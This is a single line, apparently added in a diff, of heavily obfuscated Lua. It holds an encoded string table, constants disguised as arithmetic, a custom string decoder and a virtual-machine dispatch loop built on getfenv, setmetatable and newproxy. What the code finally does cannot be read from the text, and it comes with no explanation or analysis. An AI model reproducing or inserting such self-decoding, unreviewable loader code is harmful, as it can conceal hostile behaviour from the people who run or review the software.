+return(function(...)local E={"4NapJU'I\",","4ArcL9";"4hdd";"4Qe+U`[bZ@FrY","40hpmFp\"","4N2L!$\"64%%\"O-P>K@h","4he[qU0*9:PR(M";"40R1KAbdEbZ","4NF-%ahdGipTXk8Maq";"40q9c>XI?";"4";"4XIgP2","4R==<6","4k`;:&";"4b$tJUAc4","40*9:PR(M","4k`;.nRk";"4p49hZbm";"4#=fkQb9o;8X.C_8","4AK+Z/XIS","4Qe#Is#dHUI#:IT9bJ";"4XJ\"rFX[#";"4R0imkb%%_U:M97(#s";"4hdS","4rOXtO#;YDZrFS\"i0N";"4A)/","4X`Lt>";"4h=hmfbMQUHpKkM^Rk";"4j:%8#\"P+^\"Q3lBjRk";"4RR]%TP>u>![;M`.";"4hf5&bP=(1c[Hg]=plo","4R(^S<";"40R1M7R=\'t^";"4bdQ*-:5h";"4r.R>,XE:b0oomHhh,9";"4AVepMT6Ua]#RYYk";"4V,Y?nVR$o?]W(_PVUoMWY`qGjT`pp:#DB_#T;Z9VV\"Z4Ade/r6)Y&9!Cq`uIcJLe_Qo6.8i]fXE^j\\scca)LB<DqbCqT>qJVGS\'#at=<UK\'?mm3q:]bc-VYj<dR4m5GE)Qk$_8d<h/\"LOtYcl%TA@o8XH(/q24c%`@TOqA2U","4[-Qm8pEplgpE.Bl0hV?-","4k`;+dp\'g?";"4A_K`3";"40ZB\"opE.XMXP05W";"4Li,Pd=<$h","4pER3Qbm","4\'.7pk:n#-Cp2>?W";"4Lm","4k`;Sg0hAa6X.CE","4b-[[Uhg";"4bWqeJRCs"}local function I(I)return E[I+(-826830+883346)]end for I,T in ipairs({{1991581761%10593520,-300525+300573};{915042229%5613756;-489444-(-489472)};{453278-453245;2675541954%11838681}})do while T[-584837+584838]<T[75797732%5053182]do E[T[-38559-(-38560)]],E[T[3206577923%13762137]],T[187504-187503],T[1020185-1020183]=E[T[1771871080%8771639]],E[T[208265773%5340148]],T[-308026+308027]+(78945-78944),T[-126982-(-126984)]-(-420728-(-420729))end end do local I={["3"]=744643-744617;J=1021674+-1021658,q=-217671-(-217723);["/"]=-716160+716196;K=-197681+197681;C=418954+-418903;W=-363071+363116,["4"]=-195346+195341;t=914097883%3856953,M=-334980+335015;b=270858141%14255691,N=77612351%5970180,B=46641717%613706,U=26975-26943;Y=88504345%355439,j=881610557%9688028,c=66386350%1475252;m=2913233981%11988617,z=-712152-(-712200);s=-500882+500888,h=290197070%1511443,i=80215814%1485477,A=130715-130711,["1"]=2453951478%13709226,I=-242482+242520,D=470445-470383,e=1316891689%11160099;O=617597989%4901571,g=323175785%6595423,y=398101-398100;o=956784-956781,x=389429-389383,r=685646+-685627;v=-303084-(-303123);d=484454+-484394;["0"]=66594-66552;T=2867463067%12150267;H=2009474268%12032780,["2"]=1023818+-1023793,L=393056-393053;p=901782930%14090358;E=953762-953734;k=-34583+34657,Q=-988631+988680;V=223501+-223464,["6"]=2816693019%13673267,X=375691169%1869110,P=883668+-883653,R=-688922-(-688952),F=-907822-(-907845);["9"]=1615912753%10845052;w=906428+-906388,G=218571-218527,["7"]=640395-640374;["5"]=-157445-(-157478),Z=-534821-(-534823);n=-47533-(-47580),S=-659367+659430,f=-866174-(-866215);l=520168585%14861959,["8"]=393380231%1812812;["+"]=2794909251%15614018,a=146858242%825046;u=1056176617%5588236}local T=string.sub local V=table.concat local U=string.char local M=string.len local L=math.floor local b=table.insert local s={[")"]=905955+-905907;T=-619244+619272,["."]=61197695%2781711,F=-241603+241682,["<"]=1454422070%5960746,["$"]=585762+-585695;["0"]=325617+-325580,g=174097858%9163042;["("]=187227689%5200768,A=-335016+335049,R=736539945%4661645;X=-141838-(-141869);S=-216156-(-216212),["#"]=-588899-(-588925);m=1574063047%13929761,C=990376-990307;I=-260845+260925;P=2091342817%11815496;["&"]=248719592%12435977;["7"]=1120436036%16238203,K=-765812-(-765832);D=440713+-440670,n=-342679+342738;Q=221465-221450;a=-942756-(-942780);h=42367-42333;s=-401802-(-401804),i=636442018%3857224,["8"]=2116738494%16537019;[":"]=887524-887486;["="]=240768-240755,o=-531000+531016;N=10442-10423;["!"]=773921351%14883102;["9"]=670176833%8935691,p=688736964%7486271,["@"]=171270+-171187,["\\"]=1570662281%14150110,G=1203445356%5928302,["4"]=895158+-895080;["/"]=-686534-(-686534),l=-174249-(-174326);M=-522843-(-522848);["5"]=110857504%1421250;["]"]=369987225%1728912,["?"]=300231-300147;["2"]=1217626206%10496777,[">"]=63483530%1923743,["\'"]=-948964+948986,j=897762+-897745,["*"]=-409501+409510,_=249166+-249147;["-"]=3249633025%13050735,q=1969475928%13397795,k=-1016659+1016689;f=835844176%10319063;e=-684555+684627;Y=533998+-533953;W=234729814%998850,H=105030+-104969,["3"]=1046192-1046122,t=880670-880664,["1"]=302786+-302711,E=182952+-182901,["\""]=-981543-(-981582),[","]=171205-171139,["+"]=-586598+586642,B=2010571624%12111877;b=-155866-(-155902),c=1026532-1026518,["^"]=-558983+559065,d=1728573265%8642866;[";"]=716813-716773,u=660995913%4348657,["`"]=30290095%6058008,J=-773872-(-773953);U=1043517633%10331857;["6"]=227177-227176;O=-1048105-(-1048108);Z=304417+-304410,["%"]=-992909-(-992921);L=-456286-(-456304);V=937376+-937308,["["]=-324293-(-324320),r=-194759-(-194780)}local g=E local y=type for E=80051765%3078914,#g,46889-46888 do local u=g[E]if y(u)=="string"then local y=T(u,836422+-836421,599889567%5503574)if y=="B"then u=T(u,817260-817258)local s=M(u)local y={}local K=-238813-(-238814)local C=171014-171014 local k=3269731530%16767854 while K<=s do local E=T(u,K,K)local V=I[E]if V then C=C+V*((387718476%5239438)^(((-51259-(-51262))-k)))k=k+(-1004797+1004798)if k==-635232-(-635236)then k=1334362332%10185972 local E=L(C/(904923+-839387))local I=L((C%(144840361%1744275))/(977562-977306))local T=C%(1674355434%7376014)b(y,U(E,I,T))C=875827712%13684808 end elseif E=="="then b(y,U(L(C/(1091904340%9175116))))if K>=s or T(u,K+(725634-725633),K+941109857%8113016)~="="then b(y,U(L((C%(393499-327963))/(204664239%5531459))))end break end K=K+296356105%12348171 end g[E]=V(y)elseif y=="4"then u=T(u,582493-582491)local I=M(u)local y={}local K=651526-651525 while K<=I do local E=(I-K)+3407163255%14079187 local V=E>=380903-380898 and-714906+714911 or E local M=236484-236484 local g=V>478476751%1913907 for E=734132-734132,1307074360%5186803,-47949+47950 do local I if E<V then local V=T(u,K+E,K+E)I=s[V]if not I then g=false break end else I=557495882%15067454 end M=M*(470934+-470849)+I end if g then local E=L(M/(-916854+17694070))%(369128+-368872)local I=L(M/(-152395+217931))%(438310+-438054)local T=L(M/(-864170-(-864426)))%(556372+-556116)local s=M%(26113996%2176145)if V==-826194-(-826199)then b(y,U(E,I,T,s))elseif V==282114+-282110 then b(y,U(E,I,T))elseif V==-274973+274976 then b(y,U(E,I))elseif V==245957-245955 then b(y,U(E))end end K=K+V end g[E]=V(y)end end end end return(function(V,E,b,L,U,s,M,P,G,H,k,g,C,f,S,u,w,y,K,T)K,u,G,C,S,T,y,f,H,w,P,g,k=502393+-502393,function()K=K+(123989+-123988)y[K]=-459653+459654 return K end,function(E,I)local V=C(I)local U=function(U,M,L,b,s)return T(E,{U;M,L;b;s},I,V)end return U end,function(E)for I=1945966065%8176328,#E,3697433432%16288253 do y[E[I]]=y[E[I]]+(-105722+105723)end if U then local T=U(true)local V=L(T)V[I(-464781-(-408288))],V[I(-347270+290800)],V[I(459039+-515554)]=E,k,function()return 2694856-(-679110)end return T else return M({},{[I(-505680-(-449210))]=k,[I(352236-408729)]=E,[I(869708-926215)]=function()return 1702444174%19307616 end})end end,function(E)y[E]=y[E]-1275584279%5619314 if y[E]==684637-684637 then y[E],g[E]=nil,nil end end,function(T,U,M,L)local Z,x,K,e,B,l,Y,C,h,H,O,X,W,r,q,N,t,k,D,Ef,J,A,m,Q,c,j,s,n,o,z,R,a,v,F,y,i,p,d while T do if T<7568018-(-792651)then if T>-1032554+5734604 then if T>-915753+7600464 then if T>7946793-324626 then if T<719681093%13952796 then if T<-57958+7852644 then i,e=-814315-(-814316),-279500+279501 p=#l j=v(e,p)e=J(l,j)p=g[Q]o=e-i O=k(o)p[e]=O e,o=nil,504877+-504877 O=#l j=nil p=O==o T=p and 13346209-245412 or-976973+8656167 elseif T<948448+7047714 then J,T=l,j T=l and 16491323-648294 or 10855388-914218 else H,T,A=35184372273685-184853,{},-179335+179336 g[M[-528511+528513]]=T s=g[M[-198098-(-198101)]]k=s s=K%H Z=72153-71898 g[M[2247980388%10807598]]=s N=K%Z Z=1605740104%6662822 H=N+Z J=1095234253%4803659 g[M[365948993%1710042]]=H v=J J,Z=1565186961%8109777,I(-38761+-17712)N=#y C[K]=Z c,Q,l,T=I(-2261+-54212),N,v<J,2930161412%20856331 J,Z=A-v,-583922-(-584126)end else if T<-753775+8931933 then T=15171603-(-111972)elseif T<2523066877%14536170 then B=765580+-765579 t=m[B]z,T=t,14019534-(-42015)else Ef=T t=g[K]z,T=t,t and 9279698-1018232 or 3867569781%17595928 end end else if T<1438681154%9058743 then if 409380958%13871887>T then a=u()F=391034644%9093823 g[a]=W r=I(169314+-225785)x=E[r]r=I(573789-630273)i=x[r]X,m,n,r=802182+-802181,616325+-616225,1340064588%10984054,144343-144342 x=i(r,m)z=889278628%8389421 i=u()m=76529820%7652982 g[i]=x x=g[Q]r=x(m,F)x=u()g[x]=r r=g[Q]d=g[i]B,D,F=I(-414911-(-358435)),820272+-820272,120982-120981 m=r(F,d)r=u()g[r]=m F=g[Q]d=F(X,z)F=33794-33793 m=d==F d,z=I(445227+-501717),I(10944-67431)F=u()g[F]=m t=E[B]R=g[Q]h={R(D,n)}m=I(255737+-312219)B=t(V(h))m,t=p[m],I(248489+-304976)Ef=B..t X=z..Ef m=m(p,d,X)d=u()g[d]=m Ef=G(9302253-(-916848),{Q,a,J,k;K;O;F,d;i,r,x;v})z=I(-983717-(-927232))X=E[z]z={X(Ef)}X=g[F]T,m=X and 2806183744%15536204 or 7598033-(-759435),{V(z)}elseif T<800281+6494377 then A=1967119760%9065068 c=Z==A T=c and 6879927-694779 or 4329168-(-606024)elseif 1164268486%8263643>T then c=-426022+426023 s=Z==c T=s and 1693008703%10736523 or-177857+15679498 else A=641232+13028289<11633018-153736 c=g[K]s=c==A T=s and-1039181+9134031 or 14894038-(-389537)end else if 1123903181%18302307>T then K=g[M[913719192%11866483]]k=nil y=#K T=E[I(829306-885813)]C=g[M[987324-987323]]K=C[y]s={K}C=g[M[-418434-(-418435)]]C[y]=k elseif T<2235575350%23453082 then T=3995091096%20651583 else s,C,K=13274117-(-217731),3970494-308750,I(-1042692-(-986192))y=K^C T=s-y s,y=I(615719-672199),T T=s/y s={T}T=E[I(-238498-(-181987))]end end end else if 506852+5012990>T then if T>-249170+5359686 then if 1634263160%14289117>T then T=1588677-929663 elseif 2709463493%22163805>T then T=9766381-(-670649)else T=g[M[-740917+740924]]T=T and 413816+2769677 or-811729+6342205 end else if T<2935627863%15264708 then T=1458737463%12928575 elseif 515734+4370963>T then y=nil g[M[20116554%300247]]=s T=613032+4896177 elseif T<-836330+5835298 then Q=279394-279389 A=Z==Q T=A and 734848+1821828 or 12294420-11006 else j=e i,T=j,2302258014%12614473 l[j]=i j=nil end end else if T>195429+5920756 then if T<1245694497%6291647 then T,c=546192739%16531325,590635+9215455<3162919-(-937647)g[K]=c elseif T<6712590-353162 then H=I(-660226-(-603758))N=u()v=w(1450551584%17102694,{N})T=6668902-644281~=1586649943%19236351 g[K]=T Z=T k=E[H]H=I(151932-208444)C=k[H]H=u()J=I(266303+-322788)k=u()g[k]=C C=G(284499754%19627038,{})g[H]=C C=3516440414%14377450<=456957+2293970 g[N]=C Q=E[J]J=Q(v)T,C=J and 9105645-(-56508)or 1756433612%22952188,J else i,e=not o,O+e j=p>=e j=i and j i=p<=e i=o and i j=i or j i=5985507-922762 T=j and i j=10069811-(-954832)T=T or j end else if T<1079329055%15338949 then T={}C=g[M[249255204%2026465]]y,K,k=T,84306+-84305,C C=1996348057%8115236 H=C C=854041162%5849597 N,T=C>H,492750+16022125 C=K-H elseif-796138+6657136>T then W=363677+1919277~=6765545-(-126333)T=W and 10502208-(-212631)or 15708540-(-814412)else T=4919390-(-755384)end end end end else if T<179944617%3690754 then if T<-53613+2003056 then if T<824428893%5965956 then if T<-688839+764228 then A,c,K=36955+-36700,-535108-(-535108),C T=g[M[1010767927%8284983]]Z=T(c,A)T=16097249-(-417626)y[K]=Z K=nil elseif 737178+-362301>T then T=-960765+6635539 elseif 2963689001%14453740>T then T,Z=1344632505%6908034,nil else i,W=not o,W+q a=Y>=W a=i and a i=Y<=W i=o and i a=i or a i=-204914+7150409 T=a and i a=811398+10865273 T=T or a end else if T<1179570-(-525105)then T=2761617058%18839738 elseif 1028849+841921>T then A,W=J,I(-50181+-6287)a=E[W]W=I(781773-838278)O=a[W]a=O(y,A)A=nil O=g[M[1576954230%7300714]]W=O()p=a+W e=p+Z p=1046164+-1045908 j=e%p Z,a=j,1000241+-1000240 O=Z+a T=823407504%19360296 p=k[O]e=c..p c=e else O=I(989964+-1046443)p=E[O]O,T=I(499334+-555808),475474444%10390317 e=p[O]l=e end end else if T<2374954-48822 then if T<993638622%14371337 then K=g[M[706856-706854]]C=373937+-373724 y=K*C K=27552855017688-546491 s=y+K y=-475420+35184372564252 T=s%y g[M[-622351+622353]]=T T=9575370-(-317093)elseif T<-974234+3123069 then T=-689675+4413639 elseif T<831755031%18432528 then A=102569492%3266354>=936586-(-236249)T=A and 13024441-278205 or 1157335688%8436258 else W=G(5223624796%21473973,{H})Y={W()}T,s=E[I(643318+-699822)],{V(Y)}end else if 2948363382%15923884>T then h=3005664851%15573393 R=m[h]T=9762537-(-355950)h=g[d]B=R==h Ef=B elseif T<2436350932%14149461 then J=12652457-(-732374)<866664+11425238 Q=g[K]A=Q==J T=A and 10355078-(-373253)or 15610815-(-619550)else h,t=274792-274791,T R=m[h]h=11410359-(-68251)>-317257+12523526 B=R==h Ef,T=B,B and 1308996-(-1024013)or 11162527-1044040 end end end else if T<-814612+4487065 then if 3409087-121057>T then if 3108477-190441>T then s,T={K},E[I(-453994+397481)]elseif 2287290134%19035184>T then g[K]=a T=W W=g[K]T=W and 712269+1322115 or 2972088823%18877229 elseif T<4002911-838023 then T=9388059-52482 else y=I(104424-160913)T=E[y]C=-258908-(-258908)K=g[M[460903388%5834220]]y=T(K,C)T=4932355577%19473617 end else if 582813+2830241>T then s,C,K=3153841611%13556053,3056606483%17480867,I(880003-936505)y=K^C T=s-y s,y=I(185106+-241575),T T=s/y s={T}T=E[I(-664185+607727)]elseif T<-284097+3811339 then A,T=2654067107%17080617>1886047408%21752667,890653094%11124926 g[K]=A else s=2313758-(-163566)~=14033734-(-748037)g[K]=s T=-165049+824063 end end else if T>-322282+4455956 then if 910980482%11054217>T then C,Z=C+H,not N s=C<=k s=Z and s Z=C>=k Z=N and Z s=Z or s Z=9365092-309416 T=s and Z s=6533935-239007 T=T or s elseif T<812206+3802752 then g[K]=X T=z T=3693096884%21140425 else T=28835629%11838671 end else if 1965529040%8383656>T then H=S(H)v=S(v)k=S(k)J=S(J)C=nil O=S(O)j,v=nil,I(249758-306226)K=S(K)k,p,C,K=-422079+422081,nil,nil,nil e=nil Q=S(Q)Z,j=nil,I(-657342-(-600871))Q=u()N=S(N)H=u()Z=I(-906464-(-849993))g[H]=k l=nil N=E[Z]Z=I(-1043081-(-986567))k=N[Z]e=570991936%10573920 Z=u()N=u()g[N]=k k=1426396640%7352560 g[Z]=k k={}g[Q]=k l=I(211890-268369)J=E[v]v=I(868434-924906)k=J[v]v=E[l]p,T,l=e,6111876-(-312052),I(105125-161623)J=v[l]l=E[j]j=I(-454037-(-397553))v=l[j]l,j={},1065538801%7399575 e=1074289945%6886474 O=e e=-396310+396310 o=O<e e=j-O elseif T<3429947398%15093212 then T,s=E[I(-441586-(-385085))],{K}else T=-74556+5232843 end end end end end else if 2583671368%26239450>T then if T<-681790+11161286 then if T>257714817%9916319 then if 2689245591%24135827>T then if 3726267970%17447658>T then C=-886729+886730 K=g[M[-887745-(-887748)]]y=K*C C,K=803342881%7438360,232875-232618 s=y%K g[M[558655743%6207286]]=s K=g[M[81666255%3024676]]y=K~=C T=y and 10178819-470937 or 3284137760%13815381 elseif 1471524324%16607892>T then j=I(-741037+684563)l=E[j]J,T=l,1013592+14829437 else T=t T,X=4181490-(-413977),Ef end else if T<131120+10115966 then H,k=3722733197%15707735,-798941-(-798942)K=g[M[847606-847605]]C=K(k,H)K=812535967%4103717 y=C==K s,T=y,y and 11627472-(-632132)or-551605+11073568 elseif T<10658615-302564 then J,j=J+v,not l A=Q>=J A=j and A j=Q<=J j=l and j A=j or A j=2510784-669775 T=A and j A=11339090-21092 T=T or A else T=14347833-621929~=8366469-43721 T=T and 15576321-(-58288)or 15729051-487207 end end else if T>2562468237%13950639 then if 9806524-119071>T then z=T Ef=g[K]X,T=Ef,Ef and 440215756%11823923 or 1950612192%13420805 elseif T<1904949522%21784310 then Q,C=-803882+803884,548987954%9465309 K=g[M[-936502+936505]]y=K%C C=-20184+20197 N=g[M[-218439+218442]]H=N-y N=839204+-839172 k=H/N K=C-k H=g[M[952399+-952395]]T=2359220401%16331913 c=g[M[353814-353812]]A=Q^K Z=c/A N=H(Z)H,A=4295020114-52818,960738626%5489935 k=N%H N=-13806+13808 H=N^y C=k/H v=1213927417%12514713 H=g[M[1035168-1035164]]c=C%A A=4295679689-712393 Z=c*A N=H(Z)H=g[M[564141-564137]]Z=H(C)j=877695+-877439 k=N+Z c=1008117-942581 N=-503525-(-569061)H=k%N Z=k-H A=703575040%2780928 N=Z/c c=H%A J=H%v Q=H-J J,y,H=897124446%14469745,nil,nil A=Q/J C,J,k,K=nil,1699908064%7455736,nil,nil Q=N%J l=N%j v=N-l l,N=193254+-192998,nil J=v/l Z={c;A,Q,J}g[M[875186-875185]]=Z else y,s=I(-674928+618434),I(-697572+641083)T=E[s]s=T(y)s,T={},E[I(-171166+114691)]end else if T<3577430373%17843603 then T=909485+1409771 elseif T<2585193298%11103812 then Z,s=C,124737-124737 T=Z==s T=T and-808545+16442143 or 8085715-743375 elseif 2161909725%10449810>T then Q=g[N]T,C=2337511374%23973650,Q else c=657821+5771013<=2138930832%16483347 T=c and 2225842-(-920441)or 5429761-795312 end end end else if 1272920644%19117414>T then if T>2666641685%15622914 then if T<2838191430%11446583 then Q=198158+4517237<=1956091537%21587829 A=g[K]c=A==Q T=c and 3688982714%18334275 or 2960061095%17166053 elseif T<10752062-(-267914)then T=-297266+956280 else T=8538936-859742 end else if T<10605353-(-13048)then T=2176715404%20812075 K=g[M[643524471%2692571]]C=g[M[740563+-740560]]y=K==C s=y elseif 11599514-877929>T then W=g[Q]q,o=494044999%4016626,183668+-183662 Y=W(q,o)W,o=I(-108467+51986),I(-738520+682039)E[W]=Y q=E[o]o=697848-697846 W=q>o T=W and 12266763-(-725282)or 12420590-(-720701)elseif T<355586689%24632428 then T=-541960+11557270 else T=967347858%27216647>=13209277-(-702409)T=T and-1031550+5801202 or 11560780-(-829770)end end else if T<11177659-(-694338)then if T<-516505+11981062 then N,T,Z,A=nil,79997432%4286177,nil,c C[K]=A k,c=nil,nil elseif 3126123887%13966278>T then y=g[M[1022478-1022477]]s=#y y=-952222+952222 T=s==y T=T and 911185+1087170 or 8310204-885275 else Y=g[K]W,a=T,Y T=Y and-446438+12597370 or 1019683+1970143 end else if T<12795425-713977 then p,v,J=I(-171552+115073),I(-334870-(-278391)),I(306413+-362884)Q=E[J]J,T=I(586470+-642954),Z Z=Q[J]Q=u()g[Q]=Z J=E[v]j,v=T,I(-419226-(-362716))Z=J[v]e=E[p]l,v=e,T T=e and 1670602-(-229930)or 232545+7677634 elseif T<132822523%17242753 then T=10133585-(-603478)else T=3288859-299033 Y=l==j a=Y end end end end else if 966543+13502956>T then if 12641594-(-416412)>T then if T<5238569360%21866046 then if T<2024171009%15476150 then T=s and 12810983-388487 or-43929+5553138 elseif 986846+11350136>T then Q=948340-948334 A=Z==Q T=A and 2863844-(-569698)or 963239-304225 elseif 105680+12300843>T then T=-166922+15783319 else s=I(-918776-(-862277))A=w(814821+2577746,{})k,c=I(-873363-(-816887)),I(-155528+99043)T=E[s]y=g[M[1446105276%10633127]]C=E[k]Z=E[c]c={Z(A)}N,Z={V(c)},-352443-(-352445)H=N[Z]k=C(H)C=I(320-56810)K=y(k,C)y={K()}s=T(V(y))y=s K=g[M[-48007+48012]]s,T=K,K and 2481858385%19439710 or 122190438%10668385 end else if T<12552845-(-316295)then T=765098+1498189 elseif 1789611118%24675104>T then q,i=I(623560+-680036),I(687087+-743595)W=E[q]o=E[i]q=W(o)W=I(863010-919491)E[W]=q T=799422+-708682 else C=g[M[123002716%897830]]T=2528449867%20028664 K=C==y s=K end end else if-831115+14734419>T then if 14069645-948601>T then e=u()j={}p=f(-454122+12065238,{e,Z;H;N})d=nil O=u()r,v,o=I(-623253-(-566760)),nil,I(289177-345668)g[e]=j j=u()F=I(689918-746404)g[j]=p p,i={},{}g[O]=p p=E[o]m=g[O]T,J,x=E[I(415215+-471718)],nil,{[r]=m,[F]=d}o=p(i,x)v=I(-46225-10270)p=G(2736385017%15819113,{O,e;Q,Z;H;j})K,k=o,nil O=S(O)C=p H=S(H)l=nil Q=S(Q)l=22126428475115-(-137556)N=S(N)H=I(74849+-131326)Z=S(Z)k=E[H]s={}j=S(j)e=S(e)Z=I(-131961+75469)N=E[Z]J=C(v,l)C=nil Q=K[J]K,J=nil,I(-171055+114572)J=N[J]Z={J(N,Q)}H=k(V(Z))k=H()elseif T<-16665+13527970 then o=I(-248201+191720)W=E[o]o=I(434791+-491299)E[o]=W T=463866-373126 else T=g[M[-229680+229680]]K=g[M[-239804+239815]]y[T]=K T=g[M[220641-220629]]K={T(y)}T,s=E[I(76107+-132604)],{V(K)}end else if 902076+13091342>T then T=649346+642411~=10957358-57083 g[M[-498666-(-498667)]]=T T,s=E[I(-416311-(-359823))],{}elseif 14943197-774390>T then D=18955+-18954 g[K]=z h=g[r]T=Ef R=h+D B=m[R]t=l+B B=-1021917-(-1022176)Ef=t%B l=Ef R=g[x]B=j+R T,R=13796705-(-866229),-932193+932449 t=B%R j=t else y,T,s=U,I(138882+-195388),1661887458%13189583 K=u()C=399628138%2682068 k=C C=304733+-304732 H=C C=-288138+288138 N=H<C C=s-H g[K]=T T=3747443-(-726466)end end end else if T>2893633112%17233527 then if 16374132-287655>T then if 16699770-960951>T then s=I(670273+-726754)T=E[s]y=I(-276571-(-220063))s=E[y]y=I(223320-279828)E[y]=T y=I(-380117+323636)E[y]=s y=g[M[-197806-(-197807)]]K=y()T=941729058%13695471 elseif T<4402738614%23971835 then T=v a=P(-407313+7972454,{})e=170015285%4722645 v=u()o=I(805643-862119)g[v]=J j,O=-11751+11754,I(-716012-(-659527))J=g[Q]l=J(j,e)J=u()g[J]=l l,j=-890171+890171,991048960%12388112 T=-751175+1436764 p=E[O]O={p(a)}e={V(O)}O=275423-275421 p=e[O]a=I(586384+-642883)O=E[a]W=g[k]q=E[o]o=q(p)q=I(-139051-(-82561))Y=W(o,q)W={Y()}a=O(V(W))O=u()g[O]=a W=g[J]a,Y=346846605%13340254,W W=482600251%6521625 q=W W=290746+-290746 o=q<W W=a-q else A=69364+-69361 c=Z==A T=c and 10350942-(-404606)or 97310+7149666 end else if 495353+15877267>T then T=175496757%7531890 elseif 17508050-989137>T then Z,C=not N,H+C K=k>=C K=Z and K Z=C>=k Z=N and Z K=Z or K Z=1988512978%11696782 T=K and Z K=13623851-(-257469)T=T or K else T,s=E[I(-553457+496961)],{}end end else if T>2061925486%25904125 then if T<4299035383%17555231 then c=1020904-1020902 s=Z==c T=s and 2551674368%16874526 or 5178148798%20164868 elseif 16527031-902034>T then T=1400801096%16544921>=13790911-(-615288)g[K]=T T=2574376156%10859566 else s=g[K]c=I(1046891+-1103397)T=s~=c T=T and-772141+12867714 or-68096+15684493 end else if T<14477420-(-474969)then T=1529852-844263 F=S(F)d=S(d)a=S(a)i=S(i)m=nil r=S(r)x=S(x)elseif T<14596622-(-666087)then s,T={},E[I(274230+-330739)]elseif 731334058%20455528>T then T=602066+56948 else y,K=U[411136+-411135],U[-604058-(-604060)]T=g[M[-896604+896605]]C=T T=C[K]T=T and 1993144175%12917929 or-444439+8526584 end end end end end end end T=#L return V(s)end,{},function(E,I)local V=C(I)local U=function()return T(E,{},I,V)end return U end,function(E,I)local V=C(I)local U=function(...)return T(E,{...},I,V)end return U end,function(E,I)local V=C(I)local U=function(U)return T(E,{U},I,V)end return U end,function(E,I)local V=C(I)local U=function(U,M,L)return T(E,{U,M,L},I,V)end return U end,{},function(E)local I,T=556023161%2527378,E[-256583-(-256584)]while T do y[T],I=y[T]-(-40713+40714),I+(715282-715281)if y[T]==-525343+525343 then y[T],g[T]=nil,nil end T=E[I]end end return(H(-604395+14880460,{}))(V(s))end)(unpack or table[I(71436+-127910)],getfenv and getfenv()or _ENV,select,getmetatable,newproxy,{...},setmetatable)end)(...)
